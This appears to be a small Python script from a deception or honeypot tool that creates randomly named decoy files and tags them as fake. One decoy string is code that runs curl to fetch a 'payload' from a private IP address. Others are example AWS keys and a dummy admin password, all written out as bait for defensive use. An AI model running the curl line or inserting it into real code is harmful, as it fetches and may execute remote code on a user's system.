import os
import random
from modules.core import tags

FAKE_DIR = "fake_data"
os.makedirs(FAKE_DIR, exist_ok=True)

FAKE_CONTENT = [
    "import os\nos.system('curl http://192.168.0.5/payload')",
    "aws_access_key_id=AKIAIOSFODNN7EXAMPLE\naws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "# exploit code from CVE-2025-XXXX",
    "username=admin\npassword=hunter2"
]

def generate_fake_file():
    name = f"decoy_{random.randint(1000, 9999)}.txt"
    path = os.path.join(FAKE_DIR, name)
    with open(path, "w") as f:
        f.write(random.choice(FAKE_CONTENT))
    tags.tag_fake(path)
    print(f"[+] Fake file created and tagged: {path}")
